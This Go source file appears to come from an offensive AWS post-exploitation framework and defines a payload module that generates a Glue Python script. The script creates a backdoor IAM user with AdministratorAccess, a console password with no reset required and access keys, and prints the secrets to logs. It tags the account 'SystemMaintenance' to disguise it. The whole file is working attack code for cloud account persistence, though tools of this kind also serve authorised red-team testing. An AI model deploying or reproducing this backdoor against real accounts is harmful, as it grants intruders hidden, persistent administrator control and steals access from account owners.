package glue

import (
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
)

// BackdoorCreateUserPayload generates a Glue Python Shell script that creates
// an IAM user with administrator privileges, access keys, and optionally console access.
// Credentials are printed to stdout (visible in CloudWatch Logs).
type BackdoorCreateUserPayload struct{}

func init() {
	payloads.Register(&BackdoorCreateUserPayload{})
}

func (p *BackdoorCreateUserPayload) GetName() string {
	return "backdoor/create-user"
}

func (p *BackdoorCreateUserPayload) GetDescription() string {
	return "Create an IAM user with administrator privileges and access keys via Glue job"
}

func (p *BackdoorCreateUserPayload) GetTags() []string {
	return []string{
		payloads.TagServiceGlue,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorCreateUserPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "USER_NAME",
			Description: "Name for the backdoor user (auto-generated if empty)",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "CONSOLE_ACCESS",
			Description: "Enable console password for the user (true/false)",
			Required:    false,
			Default:     "true",
		},
		{
			Name:        "ACCESS_KEY",
			Description: "Create programmatic access keys (true/false)",
			Required:    false,
			Default:     "true",
		},
	}
}

func (p *BackdoorCreateUserPayload) Validate(options map[string]string) error {
	return nil
}

func (p *BackdoorCreateUserPayload) GenerateCode(options map[string]string) (string, error) {
	userName := options["USER_NAME"]
	consoleAccess := options["CONSOLE_ACCESS"] != "false"
	accessKey := options["ACCESS_KEY"] != "false"

	userNameCode := "f'pathrunner-admin-{int(time.time())}'"
	if userName != "" {
		userNameCode = fmt.Sprintf("'%s'", userName)
	}

	consoleCode := ""
	if consoleAccess {
		consoleCode = `
    # Create console login profile
    password = ''.join(random.choices(string.ascii_letters + string.digits + '!@#$%^&*', k=16))
    iam.create_login_profile(
        UserName=user_name,
        Password=password,
        PasswordResetRequired=False
    )
    print(f"Console password: {password}")

    account_id = boto3.client('sts').get_caller_identity()['Account']
    print(f"Console URL: https://{account_id}.signin.aws.amazon.com/console")
`
	}

	accessKeyCode := ""
	if accessKey {
		accessKeyCode = `
    # Create programmatic access keys
    key_response = iam.create_access_key(UserName=user_name)
    access_key = key_response['AccessKey']
    print(f"--- PATHFINDER_IDENTITY_DATA ---")
    print(f"NAME=backdoor/{user_name}")
    print(f"TYPE=keys")
    print(f"ACCESS_KEY_ID={access_key['AccessKeyId']}")
    print(f"SECRET_ACCESS_KEY={access_key['SecretAccessKey']}")
    print(f"AUTO_SWITCH=false")
    print(f"--- END_PATHFINDER_IDENTITY_DATA ---")
`
	}

	code := fmt.Sprintf(`import boto3
import time
import random
import string
import sys

user_name = %s

# Override from job arguments if provided
for i, arg in enumerate(sys.argv):
    if arg == '--USER_NAME' and i + 1 < len(sys.argv):
        user_name = sys.argv[i + 1]

iam = boto3.client('iam')

try:
    # Create the user
    user_response = iam.create_user(
        UserName=user_name,
        Tags=[
            {'Key': 'Purpose', 'Value': 'SystemMaintenance'},
            {'Key': 'CreatedBy', 'Value': 'AutomatedProcess'}
        ]
    )
    print(f"Created user: {user_response['User']['Arn']}")

    # Attach AdministratorAccess
    iam.attach_user_policy(
        UserName=user_name,
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    print(f"Attached AdministratorAccess to {user_name}")
%s%s
    print(f"Backdoor user {user_name} created successfully")

except Exception as e:
    print(f"Error: {e}")
    raise
`, userNameCode, consoleCode, accessKeyCode)

	return code, nil
}

func (p *BackdoorCreateUserPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
